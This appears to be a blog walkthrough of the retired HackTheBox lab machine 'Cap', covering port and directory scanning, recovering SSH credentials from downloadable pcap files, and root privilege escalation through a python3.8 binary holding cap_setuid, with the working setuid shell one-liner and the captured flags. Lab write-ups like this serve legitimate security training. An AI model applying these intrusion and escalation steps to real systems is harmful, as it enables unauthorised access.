---
layout: post
title: "O Cap! My Cap!"
date: 2025-10-22
---

## Challenge Description
This is a retired HTB machine called Cap. Its a cool Machine to pwn.

## Solution

```
nmap 10.10.10.245

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-18 18:59 CEST                                                                  
Nmap scan report for 10.10.10.245                                                                                                 
Host is up (0.083s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.96 seconds
```

```
gobuster dir -u http://10.10.10.245:80/ -w /path/to/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt -t 50 -x php,html,txt

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.245:80/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /path/to/SecLists-master/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/data                 (Status: 302) [Size: 208] [--> http://10.10.10.245/]
/ip                   (Status: 200) [Size: 17460]
/netstat              (Status: 200) [Size: 39396]
/capture              (Status: 302) [Size: 222] [--> http://10.10.10.245/data/15]
Progress: 326564 / 326564 (100.00%)
===============================================================
Finished
===============================================================
```

```
whatweb 10.10.10.245

http://10.10.10.245 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.10.10.245], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
```

`JQuery 2.2.4` its vulnerable to `XSS`, and its related to `CVE-2020-11023`. We can test it by using the console in the inspection tab.

But i was not able to retrive any cookie for authentication. By looking at the webpage more closely i noticed that the endpoint `/data` allows us to download `.pcap` files, at multiple endpoints like `/data/0` or `/data/1`. Lets take a look at them with `Wireshark`, maybe we can find some useful information for moving forward.

Nice! We found credentials!

`nathan/Buck3tH4TF0RM3!`

Lets try to enstablish an ssh connection!

```
nathan@cap:~$ cat user.txt 
52c5b8d39051cc9760776909f6b4317a
```

We got the user flag! Lets move to the root flag!

If we run linepeas we can find lots of vulnerabilities to use, for example we know that we are running `Sudo version 1.8.31`, that is vulnerable to root privilege escalation `(CVE-2021-3156)`. But I noticed that we also have getcap, we can use it to check what type of privileges have been assigned to binaries. Lets run it.

```
getcap -r / 2>/dev/null

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep

/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

This approach is way more easier and faster. The first line its crucial! We can run `python3.8` with `cap_setuid`, lets make some testing.

```
/usr/bin/python3.8 -c 'import os; os.setuid(0); print("euid=", os.geteuid());'

euid= 0
```

Nice! Its working! Now lets try to spawn a shell.

`/usr/bin/python3.8 -c 'import os,pty; os.setuid(0); pty.spawn("/bin/bash")'`

Nice! We are root!

```
root@cap:~# cat /root/root.txt 
866c59913e8cfee37d03fcf4c7f8635a
```